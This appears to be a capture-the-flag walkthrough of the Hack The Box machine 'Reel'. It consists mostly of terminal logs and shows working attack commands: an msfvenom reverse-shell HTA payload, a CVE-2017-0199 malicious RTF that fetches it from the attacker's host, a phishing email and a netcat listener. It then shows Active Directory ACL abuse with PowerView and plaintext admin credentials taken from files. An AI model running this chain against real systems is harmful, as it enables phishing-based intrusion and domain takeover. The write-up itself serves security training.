
```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel/ftp]
└─$ ftp 10.10.10.77  
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:arun): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41008|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41009|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> 
```
readme.txt
	
	This document is also short, but does give a hint as to the kinds of documents that will be read:
	please email me any rtf format procedures - I’ll review and convert.

AppLocker.docx

	- AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f hta-psh -o rev2.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7429 bytes
Saved as: rev2.hta

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel]
└─$ python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w arun2.rtf -u http://10.10.14.12/rev2.hta -t RTF -x 0
Generating normal RTF payload.

Generated arun2.rtf successfully

```

```bash
──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel]
└─$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel]
└─$ nc -lvp 443                             
listening on [any] 443 ...


```

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Reel]
└─$ sendemail -f 0xarun@megabank.com -t nico@megabank.com -u "Please check the mail" -m "Hello world" -a arun2.rtf -s 10.10.10.77
Feb 13 14:53:18 kali sendemail[92047]: Email was sent successfully!
```

## Privesc

```bash

C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB


```

```bash
┌──(arun㉿kali)-[~]
└─$ ssh tom@htb.local               
The authenticity of host 'htb.local (10.10.10.77)' can't be established.
ED25519 key fingerprint is SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'htb.local' (ED25519) to the list of known hosts.
tom@htb.local's password: 
                                                                                                                                                                     
Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

tom@REEL C:\Users\tom>whoami                                                                                                    
htb\tom                                                                                                                         


```


```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> ls                                                                       


    Directory: C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors                                                               


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---        11/16/2017  11:50 PM     112225 acls.csv                                                                           
-a---        10/28/2017   9:50 PM       3549 BloodHound.bin                                                                     
-a---        10/24/2017   4:27 PM     246489 BloodHound_Old.ps1                                                                 
-a---        10/24/2017   4:27 PM     568832 SharpHound.exe                                                                     
-a---        10/24/2017   4:27 PM     636959 SharpHound.ps1                                                                     


PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> copy .\acls.csv \\10.10.14.12\share\acls.csv                             
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>                                                                          
                                                                                                                                                                        

```

## WriteOwner Tom to claire

```
PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1                                                                  
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                     
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "qwerty@1" -AsPlainText -force                      
PS C:\Users\tom\Desktop\AD Audit\BloodHound>                                                                                    
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred                     
PS C:\Users\tom\Desktop\AD Audit\BloodHound>    
```

## WriteDacl claire to Backup_Admins

```
claire@REEL C:\Users\claire>net group backup_admins                                                                                                                     
Group name     Backup_Admins                                                                                                                                            
Comment                                                                                                                                                                 
                                                                                                                                                                        
Members                                                                                                                                                                 

-------------------------------------------------------------------------------                                                 
ranj                                                                                                                            
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                 
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>net group backup_admins                                                                             
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>exit 
```

another ssh session : 

```

claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.ps1                                                 
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"                                                                                                    

```

```bash
┌──(arun㉿kali)-[~]
└─$ ssh administrator@10.10.10.77
administrator@10.10.10.77's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@REEL C:\Users\Administrator>whoami                                                                                
htb\administrator  
```